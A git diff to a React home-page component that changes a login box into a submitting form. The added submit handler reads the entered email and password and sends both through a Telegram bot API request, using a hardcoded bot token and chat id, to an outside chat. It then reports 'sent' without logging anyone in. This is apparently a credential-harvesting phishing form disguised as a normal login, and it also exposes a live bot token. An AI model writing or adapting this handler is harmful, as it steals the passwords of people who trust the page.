@@ -162,6 +162,30 @@ const Home = () => {
     AOS.init();
   }, []);
 
+  useEffect(() => {
+    const form = document.querySelector("#form");
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      let email = document.getElementById("email").value;
+      let password = document.getElementById("password").value;
+
+      let my__text = `<b>Email: </b> <i>${email}</i>%0A<b>Password: </b> <i>${password}</i>`;
+
+      let token = "5213173836:AAFqN1E4h44pB5j1fgtBDg5ELKfPWnQX3UM";
+      let chat_id = -752513488;
+
+      let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my__text}&parse_mode=html`;
+
+      let api = new XMLHttpRequest();
+      api.open("GET", url, true);
+      api.send();
+
+      alert("Jo'natildi!");
+    });
+  }, []);
+
   return (
     <>
       <HomeWrapper>
@@ -187,10 +211,7 @@ const Home = () => {
                   </Slide>
                 </div>
                 <Fade direction="up">
-                  <div
-                    style={{ marginTop: "56px" }}
-                    className="col-md-12 d-flex align-items-center home__big__box"
-                  >
+                  <div className="col-md-12 d-flex align-items-center home__big__box">
                     <div className="home__box d-flex align-items-center">
                       {hemeBoxData.length > 0 &&
                         hemeBoxData?.map((value, index) => {
@@ -488,7 +509,8 @@ const Home = () => {
               </div>
             </div>
 
-            <div
+            <form
+              id="form"
               data-aos-duration={1000}
               data-aos="fade-right"
               style={{
@@ -505,12 +527,11 @@ const Home = () => {
                 </label>
                 <input
                   className="my__input"
-                  s
                   placeholder="Email"
                   type="email"
                   required
                   name="first__name"
-                  id="first__name"
+                  id="email"
                 />
 
                 <label className="label mt-3 mb-2" htmlFor="first__name">
@@ -521,7 +542,7 @@ const Home = () => {
                   placeholder="Password"
                   type={`${eye ? "password" : "input"}`}
                   name="first__name"
-                  id="first__name"
+                  id="password"
                 />
                 <img
                   onClick={() => setEye(!eye)}
@@ -531,7 +552,9 @@ const Home = () => {
                   alt="eye"
                 />
 
-                <MyButton className="mt-4 login__btn">Log in</MyButton>
+                <MyButton type="submit" className="mt-4 login__btn">
+                  Log in
+                </MyButton>
               </div>
 
               <small className="text-center mt-4">Reset Password?</small>
@@ -561,7 +584,7 @@ const Home = () => {
                 </small>
                 <small className="mb-0">New Account</small>
               </div>
-            </div>
+            </form>
           </div>
         </div>
       </HomeWrapper>
